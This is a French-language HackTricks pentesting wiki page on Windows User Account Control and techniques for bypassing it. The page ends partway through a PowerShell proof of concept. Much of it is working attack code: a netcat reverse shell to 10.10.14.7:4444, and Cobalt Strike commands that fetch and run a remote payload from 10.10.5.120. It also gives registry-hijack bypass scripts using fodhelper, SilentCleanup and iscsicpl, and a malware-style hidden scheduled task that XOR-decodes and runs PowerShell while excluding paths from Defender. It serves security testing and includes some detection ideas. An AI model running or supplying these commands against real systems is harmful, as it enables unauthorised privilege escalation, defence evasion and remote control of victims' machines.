# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une **demande de consentement pour les activités nécessitant une élévation**. Les applications possèdent différents niveaux d’`integrity`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Lorsque l’UAC est activé, les applications et les tâches **s’exécutent toujours dans le contexte de sécurité d’un compte non administrateur**, sauf si un administrateur autorise explicitement ces applications/tâches à disposer d’un accès de niveau administrateur au système pour s’exécuter. Il s’agit d’une fonctionnalité pratique qui protège les administrateurs contre les modifications involontaires, mais elle n’est pas considérée comme une boundary de sécurité.<sup>[[2]](#references)</sup>

Pour plus d’informations sur les niveaux d’integrity :


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Lorsqu’un UAC est en place, un utilisateur administrateur reçoit 2 tokens : un token utilisateur standard, pour effectuer les actions courantes avec un niveau d’integrity moyen, et un autre avec les privilèges administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail le fonctionnement de l’UAC et inclut le processus de connexion, l’expérience utilisateur et l’architecture de l’UAC.<sup>[[2]](#references)</sup> Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de l’UAC spécifiquement pour leur organisation au niveau local (à l’aide de secpol.msc), ou le configurer et le déployer via des Group Policy Objects (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont décrits en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de Group Policy qui peuvent être définis pour l’UAC. Le tableau suivant fournit des informations supplémentaires :

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Mode d’approbation administrateur pour le compte Administrateur intégré](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Comportement de la demande d’élévation pour les administrateurs en mode d’approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Comportement de la demande d’élévation pour les utilisateurs standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Détecter les installations d’applications et demander une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Élever uniquement les exécutables qui sont signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Élever uniquement les applications UIAccess installées dans des emplacements sécurisés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Exécuter tous les administrateurs en mode d’approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Autoriser les applications UIAccess à demander une élévation sans utiliser le bureau sécurisé](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Basculer vers le bureau sécurisé lors d’une demande d’élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualiser les échecs d’écriture de fichiers et du registre vers des emplacements propres à chaque utilisateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Stratégies d’installation de logiciels sous Windows

Les **stratégies de sécurité locales** (« secpol.msc » sur la plupart des systèmes) sont configurées par défaut pour **empêcher les utilisateurs non administrateurs d’effectuer des installations de logiciels**. Cela signifie que même si un utilisateur non administrateur peut télécharger l’installer de votre logiciel, il ne pourra pas l’exécuter sans un compte administrateur.

### Clés de registre pour forcer l’UAC à demander une élévation

En tant qu’utilisateur standard sans droits administrateur, vous pouvez vous assurer que le compte « standard » **doit fournir ses identifiants via l’UAC** lorsqu’il tente d’effectuer certaines actions. Cette action nécessiterait de modifier certaines **clés de registre**, ce qui demande des permissions administrateur, sauf en présence d’un **UAC bypass**, ou si l’attaquant est déjà connecté en tant qu’administrateur.

Même si l’utilisateur appartient au groupe **Administrators**, ces modifications forcent l’utilisateur à **saisir à nouveau les identifiants de son compte** afin d’effectuer des actions administratives.

**En pratique, cela n’est utile que si vous disposez déjà d’un token élevé, d’un UAC bypass ou d’une mauvaise configuration permettant de modifier ces clés ; dans le cas contraire, l’écriture dans le registre elle-même est bloquée.**

Les clés et entrées de registre à modifier sont les suivantes (avec leurs valeurs par défaut entre parenthèses) :

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` :
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Cela peut également être effectué manuellement via l’outil Local Security Policy. Une fois ces paramètres modifiés, les opérations administratives demandent à l’utilisateur de saisir à nouveau ses identifiants.

### Remarque

**L’User Account Control n’est pas une boundary de sécurité.** Par conséquent, les utilisateurs standard ne peuvent pas sortir de leurs comptes et obtenir des droits administrateur sans exploiter une vulnérabilité de local privilege escalation.

### Demander un « accès complet à l’ordinateur » à un utilisateur
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilèges UAC

- Internet Explorer Protected Mode utilise des contrôles d’intégrité pour empêcher les processus de niveau d’intégrité élevé (comme les navigateurs web) d’accéder aux données de niveau d’intégrité faible (comme le dossier des fichiers Internet temporaires). Cela est réalisé en exécutant le navigateur avec un jeton de faible intégrité. Lorsque le navigateur tente d’accéder aux données stockées dans la zone de faible intégrité, le système d’exploitation vérifie le niveau d’intégrité du processus et autorise l’accès en conséquence. Cette fonctionnalité contribue à empêcher les attaques d’exécution de code à distance d’accéder aux données sensibles du système.
- Lorsqu’un utilisateur ouvre une session Windows, le système crée un jeton d’accès contenant la liste des privilèges de l’utilisateur. Les privilèges sont définis comme la combinaison des droits et des capacités d’un utilisateur. Le jeton contient également une liste des identifiants de l’utilisateur, utilisés pour authentifier celui-ci auprès de l’ordinateur et des ressources du réseau.

### Autoadminlogon

Pour configurer Windows afin qu’il ouvre automatiquement une session avec un utilisateur spécifique au démarrage, définissez la **clé de registre `AutoAdminLogon`**. Cela est utile dans les environnements de kiosque ou à des fins de test. Utilisez cette configuration uniquement sur des systèmes sécurisés, car elle expose le mot de passe dans le registre.

Définissez les clés suivantes à l’aide de l’Éditeur du Registre ou de `reg add` :

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` :
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Pour revenir au comportement normal d’ouverture de session, définissez `AutoAdminLogon` sur 0.

## UAC bypass

> [!TIP]
> Notez que si vous disposez d’un accès graphique à la victime, le UAC bypass est simple, car il suffit de cliquer sur « Yes » lorsque l’invite UAC apparaît.

Le UAC bypass est nécessaire dans la situation suivante : **l’UAC est activé, votre processus s’exécute dans un contexte d’intégrité moyenne et votre utilisateur appartient au groupe des administrateurs**.

Il est important de mentionner qu’il est **beaucoup plus difficile de bypass l’UAC lorsque celui-ci est configuré au niveau de sécurité le plus élevé (Always) que lorsqu’il est configuré à l’un des autres niveaux (Default).**

### Triage rapide depuis un shell d’intégrité moyenne

Avant d’essayer un bypass, vérifiez que vous êtes dans le bon scénario et faites correspondre le build de l’hôte aux méthodes connues comme fonctionnelles :
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notes pratiques :
- Si `EnableLUA=0`, vous n’avez pas besoin de bypass : tout token administrateur peut directement demander un niveau d’intégrité élevé.
- `ConsentPromptBehaviorAdmin=2` ou `5` est le scénario courant pour les bypass d’auto-elevation / basés sur COM.
- `Always Notify` relève le niveau de difficulté, mais vous devez tout de même tester la build exacte au lieu de supposer l’échec : UACME répertorie encore certaines méthodes `AlwaysNotify compatible` sur les builds modernes de Windows.<sup>[[3]](#references)</sup>

### UAC désactivé

Si UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un reverse shell avec des privilèges administrateur** (niveau d’intégrité élevé) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Très** Basic UAC "bypass" (accès complet au file system)

Si vous avez un shell avec un utilisateur qui appartient au groupe Administrators, vous pouvez **monter le partage C$** via SMB (file system) localement sur un nouveau disque et vous aurez **accès à tout le contenu du file system** (même au dossier personnel de l'utilisateur Administrator).

> [!WARNING]
> **Il semble que cette astuce ne fonctionne plus**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass avec Cobalt Strike

Les techniques de Cobalt Strike fonctionneront uniquement si UAC n’est pas configuré sur son niveau de sécurité maximal.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** disposent également de plusieurs modules pour **bypass** le **UAC**.

### Interfaces COM élevées (`ICMLuaUtil` / `CMSTPLUA`)

Les objets COM auto-élevés restent une surface UAC pratique sur les builds modernes. `ICMLuaUtil` est toujours répertorié par UACME comme fonctionnel sur les branches actuelles de Windows, et les outils offensifs continuent d'adapter `CMSTPLUA` en combinant un processus du bureau interactif, une exécution 64-bit et parfois un masquerading du PEB/processus avant d'invoquer le COM Elevation Moniker.<sup>[[3]](#references)</sup>

Conseils pratiques :
- Privilégiez un processus **64-bit** dans la **session interactive** de l'utilisateur (généralement `explorer.exe` ou un processus enfant).
- Si un shell brut échoue, réessayez depuis un BOF / une implémentation UACME plutôt qu'avec un wrapper `CreateProcess` naïf.
- Attendez-vous à ce que l'exécution enfant se produise dans un **processus élevé distinct** ; de nombreux BOF n'élèvent pas le beacon actuel sur place.

### KRBUACBypass

Documentation et outil disponibles sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass UAC

[**UACME**](https://github.com/hfiref0x/UACME) est une collection de techniques de bypass UAC. Compilez-le avec Visual Studio ou MSBuild ; le build crée plusieurs exécutables (par exemple, `Source\Akagi\output\x64\Debug\Akagi.exe`), sélectionnez donc la méthode appropriée pour le build cible.<sup>[[3]](#references)</sup>\
Attention : certains bypass lancent des programmes ou des invites visibles qui peuvent alerter l'utilisateur.<sup>[[3]](#references)</sup>

UACME indique la **version de build à partir de laquelle chaque technique a commencé à fonctionner**.<sup>[[3]](#references)</sup> Vous pouvez rechercher une technique affectant vos versions :
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
De plus, en utilisant [cette page](https://en.wikipedia.org/wiki/Windows_10_version_history), vous obtenez la release Windows `1607` à partir des versions de build.

Une méthode pratique consiste d’abord à **évaluer le build de l’hôte**, puis à lancer la méthode correspondante :
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compare rapidement le build local avec ses méthodes UAC connues, ce qui permet d’écarter rapidement les PoC obsolètes.<sup>[[4]](#references)</sup>
- `UACME` reste le meilleur catalogue public pour faire correspondre un bypass à un build précis. La version 3.7.1 a ajouté les méthodes 83–85, tandis que la version précédente a re-testé les méthodes existantes sur **Windows 11 25H2** ; vérifiez à nouveau le tableau des méthodes et les notes de version au lieu de supposer qu’un ancien PoC s’applique toujours sans modification.<sup>[[3]](#references)[[9]](#references)</sup>

### Chaînes WNF/UIAccess compatibles avec Always Notify (UACME 3.7.1)

`Always Notify` n’élimine pas tous les UAC bypass. UACME 3.7.1 implémente trois nouvelles méthodes x64 qui combinent un état d’environnement/protocole contrôlé par l’utilisateur avec le comportement de tâches planifiées élevées ou de UIAccess, et les marque toutes comme `AlwaysNotify compatible` :<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** rediriger `SystemRoot` afin que la tâche `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` déclenchée par WNF force `taskhostw.exe` élevé à effectuer le chargement latéral de `unifiedconsent.dll`. UACME la prend en charge à partir du build 19041 de Windows 10.
- **84 — TabTip:** utiliser la même primitive de variable d’environnement contre `TabTip.exe` avec UIAccess, qui charge `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ou `rsaenh.dll` selon le build, puis pivoter depuis le contexte UIAccess d’intégrité élevée obtenu. UACME la prend en charge à partir de Windows 8.1 / Server 2016.
- **85 — Narrator:** détourner le protocole `feedback-hub` par utilisateur, piloter Narrator avec `Alt+CapsLock+F`, puis lancer une copie accessible en écriture de `osk.exe` qui effectue le chargement latéral de `OskSupport.dll`. Cela nécessite un bureau interactif et est pris en charge à partir de Windows 10 1809 / Server 2019.

Après avoir construit les unités de payload et Akagi comme le documente UACME, invoquez le numéro de méthode correspondant (la commande facultative utilise `cmd.exe` par défaut) :
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Les méthodes 84 et 85 dépendent de UIAccess/de l’interaction avec le bureau ; ne vous attendez donc pas à ce qu’elles fonctionnent sans modification depuis la Session 0 ou un shell de service non interactif. Toutes trois manipulent l’état de l’environnement/du protocole et placent des DLL ; inspectez l’implémentation et supprimez ces artefacts après les tests.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Le binaire de confiance `fodhelper.exe` est auto-élevé sur les versions modernes de Windows. Lorsqu’il est lancé, il interroge le chemin de registre par utilisateur ci-dessous sans valider le verbe `DelegateExecute`. Y placer une commande permet à un processus à intégrité Medium (l’utilisateur appartient au groupe Administrators) de lancer un processus à intégrité High sans invite UAC.

Chemin de registre interrogé par fodhelper :
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Étapes PowerShell (définissez votre payload, puis déclenchez)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Remarques :
- Fonctionne lorsque l’utilisateur actuel est membre du groupe Administrators et que le niveau d’UAC est défini par défaut/avec des restrictions limitées (et non sur Always Notify avec des restrictions supplémentaires).
- Utilisez le chemin `sysnative` pour démarrer un PowerShell 64 bits depuis un processus 32 bits sur Windows 64 bits.
- Le payload peut être n’importe quelle commande (PowerShell, cmd ou chemin vers un EXE). Évitez les interfaces demandant une interaction pour rester furtif.

#### Variante CurVer/extension hijack (HKCU uniquement)

Les échantillons récents qui abusent de `fodhelper.exe` évitent `DelegateExecute` et redirigent à la place le **ProgID `ms-settings`** via la valeur `CurVer` propre à l’utilisateur. Le binaire à élévation automatique résout toujours le gestionnaire sous `HKCU`; aucun token administrateur n’est donc nécessaire pour créer les clés :<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Une fois les privilèges élevés, les malware **désactivent généralement les futures invites** en définissant `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` sur `0`, puis effectuent une évasion supplémentaire des défenses (par exemple, `Add-MpPreference -ExclusionPath C:\ProgramData`) et recréent la persistence pour s’exécuter avec une haute intégrité. Une tâche de persistence typique stocke un **script PowerShell chiffré avec XOR** sur le disque, puis le décode et l’exécute en mémoire toutes les heures :<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Cette variante nettoie toujours le **dropper** et ne laisse que les payloads staged, ce qui fait que la détection repose sur la surveillance du détournement de **`CurVer`**, de la modification de `ConsentPromptBehaviorAdmin`, de la création d’exclusions Defender ou des tâches planifiées qui déchiffrent PowerShell en mémoire.<sup>[[5]](#references)</sup>

### Contournement de l’UAC via la tâche `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` lance `cleanmgr.exe` avec les privilèges les plus élevés et développe `%windir%` depuis l’environnement utilisateur. Si vous contrôlez `HKCU\Environment\windir`, vous pouvez rediriger cette expansion vers une commande arbitraire et obtenir une intégrité élevée sans boîte de dialogue de consentement.<sup>[[8]](#references)</sup> Cette méthode mérite toujours d’être testée sur les versions récentes, car UACME maintient la technique active et le suivi récent des problèmes indique que Windows 11 24H2 pourrait ne nécessiter que de petits ajustements des guillemets.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Si la tâche met le chemin entre guillemets sur ce build, réessayez avec le payload se terminant par un guillemet (par exemple `cmd.exe"`). Nettoyez toujours `HKCU\Environment\windir` après les tests.

#### Plus de UAC bypass

De nombreux UAC bypass classiques qui exploitent les flux d'interface, les objets COM ou les interactions avec le bureau nécessitent une **session interactive complète** avec la victime ; un shell `nc.exe` classique ou un service exécuté dans la **Session 0** ne suffit souvent pas.

Vous pouvez souvent résoudre cela avec une session **meterpreter**. Migrez vers un **processus** dont la valeur **Session** est égale à **1** :

![Dirigez ms-settings vers une extension personnalisée (.thm) et associez cette extension à notre payload - Plus de UAC bypass : Vous pouvez utiliser une session meterpreter. Migrez vers un processus dont la valeur Session...](<../../images/image (863).png>)

(_explorer.exe_ devrait fonctionner)

### UAC Bypass avec une interface graphique

Si vous avez accès à une **interface graphique, vous pouvez simplement accepter l'invite UAC** lorsqu'elle apparaît ; vous n'avez donc pas vraiment besoin d'un bypass technique. Par conséquent, obtenir une session avec interface graphique suffit souvent à contourner les difficultés pratiques ajoutées par UAC.

De plus, si vous obtenez une session avec interface graphique utilisée par quelqu'un (potentiellement via RDP), **certains outils seront exécutés en tant qu'administrateur** ; depuis ces outils, vous pourriez **exécuter** directement un **cmd**, par exemple **en tant qu'administrateur**, sans qu'une nouvelle invite UAC apparaisse, comme avec [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela peut être un peu plus **stealthy**.

### UAC bypass par brute-force bruyant

Si le bruit est acceptable, un outil tel que [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) peut demander à plusieurs reprises l'élévation jusqu'à ce que l'utilisateur l'accepte.

### Votre propre bypass - Méthodologie de base pour UAC bypass

Si vous examinez **UACME**, vous remarquerez que **de nombreux UAC bypass exploitent le DLL hijacking** (souvent en faisant charger à un binaire élevé une DLL contrôlée par l'attaquant depuis un chemin accessible en écriture). [Lisez ceci pour apprendre à trouver une vulnérabilité de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trouvez un binaire qui s'**autoélève** (vérifiez que, lorsqu'il est exécuté, il s'exécute avec un niveau d'intégrité élevé).
2. Avec procmon, recherchez les événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **DLL Hijacking**.
3. Vous devrez probablement **écrire** la DLL dans certains **chemins protégés** (comme C:\Windows\System32), pour lesquels vous n'avez pas les permissions d'écriture. Vous pouvez contourner cela avec :
1. **wusa.exe** : Windows 7, 8 et 8.1. Il permet d'extraire le contenu d'un fichier CAB dans des chemins protégés (car cet outil est exécuté avec un niveau d'intégrité élevé).
2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL dans le chemin protégé et exécuter le binaire vulnérable et autoélevé.

### Une autre technique de UAC bypass

Elle consiste à vérifier si un **binaire autoElevated** tente de **lire** dans le **registre** le **nom/chemin** d'un **binaire** ou d'une **commande** à **exécuter** (c'est encore plus intéressant si le binaire recherche ces informations dans **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + DLL hijack du `PATH` utilisateur

Le binaire 32 bits `C:\Windows\SysWOW64\iscsicpl.exe` est un binaire **autoélevé** qui peut être exploité pour charger `iscsiexe.dll` selon l'ordre de recherche. Si vous pouvez placer une `iscsiexe.dll` malveillante dans un dossier **accessible en écriture par l'utilisateur**, puis modifier le `PATH` de l'utilisateur actuel (par exemple via `HKCU\Environment\Path`) afin que ce dossier soit recherché, Windows peut charger la DLL de l'attaquant dans le processus élevé `iscsicpl.exe` **sans afficher d'invite UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Notes pratiques :
- Cela est utile lorsque l'utilisateur actuel appartient au groupe **Administrators**, mais s'exécute avec une **Medium Integrity** à cause de UAC.
- La copie **SysWOW64** est celle qui est pertinente pour ce bypass. Considérez la copie **System32** comme un binaire distinct et validez son comportement indépendamment.
- La primitive combine l'**auto-élévation** et le **DLL search-order hijacking** ; le même workflow ProcMon utilisé pour les autres UAC bypass est donc utile pour valider le chargement de la DLL manquante.

Flux minimal :
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idées de détection :
- Déclencher une alerte sur `reg add` / les écritures dans le registre vers `HKCU\Environment\Path` immédiatement suivies de l’exécution de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Rechercher `iscsiexe.dll` dans des emplacements **contrôlés par l’utilisateur** tels que `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Corréler les lancements de `iscsicpl.exe` avec des processus enfants inattendus ou des chargements de DLL depuis des répertoires Windows inhabituels.

### Nouvelles recherches à examiner séparément

Certaines chaînes post-2024 ne ressemblent plus aux détournements classiques du registre `HKCU\Software\Classes`. Par exemple, l’empoisonnement du cache du contexte d’activation peut combiner un **remappage de lecteur** et une **redirection de DLL** pour passer d’une intégrité moyenne à une intégrité élevée via des binaires d’interface approuvés / à élévation automatique tels que `ctfmon.exe`, puis des cibles ultérieures comme `fodhelper.exe`. Au lieu de reproduire ici le vaste PoC, consultez les exemples compacts de payloads dans :

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Détournement de lettre de lecteur d’Administrator Protection (aperçu) via la table des périphériques DOS propre à chaque session de connexion

> [!NOTE]
> En août 2026, Microsoft documente toujours Administrator Protection comme une fonctionnalité **Insider en aperçu** : le déploiement d’octobre 2025 a été annulé et est prévu à une date ultérieure. Vérifiez que le **Mode d’approbation administrateur avec Administrator protection** est réellement activé et que l’appareil a été redémarré avant de tester ces chaînes ; une simple chaîne de version 25H2 standard ne prouve pas que la fonctionnalité est active.<sup>[[10]](#references)</sup>

Pour connaître toute la surface d’attaque de `RAiLaunchAdminProcess` / UIAccess sur les builds d’aperçu de Windows 11 25H2, consultez la page dédiée :

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 « Administrator Protection » utilise des tokens shadow-admin avec des tables `\Sessions\0\DosDevices/<LUID>` propres à chaque session. Le répertoire est créé à la demande par `SeGetTokenDeviceMap` lors de la première résolution de `\??`. Si l’attaquant usurpe le token shadow-admin uniquement au niveau **SecurityIdentification**, le répertoire est créé avec l’attaquant comme **propriétaire** (il hérite de `CREATOR OWNER`), ce qui permet aux liens de lettres de lecteur de prendre le pas sur `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Étapes :**

1. Depuis une session faiblement privilégiée, appelez `RAiProcessRunOnce` pour lancer un `runonce.exe` shadow-admin sans invite.
2. Dupliquez son token principal en un token d’**identification**, puis usurpez-le tout en ouvrant `\??` afin de forcer la création de `\Sessions\0\DosDevices/<LUID>` sous la propriété de l’attaquant.
3. Créez un lien symbolique `C:` dans cet emplacement, pointant vers un stockage contrôlé par l’attaquant ; les accès ultérieurs au système de fichiers dans cette session résoudront `C:` vers le chemin de l’attaquant, permettant le détournement de DLL/fichiers sans invite.

**PoC PowerShell (NtObjectManager) :**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
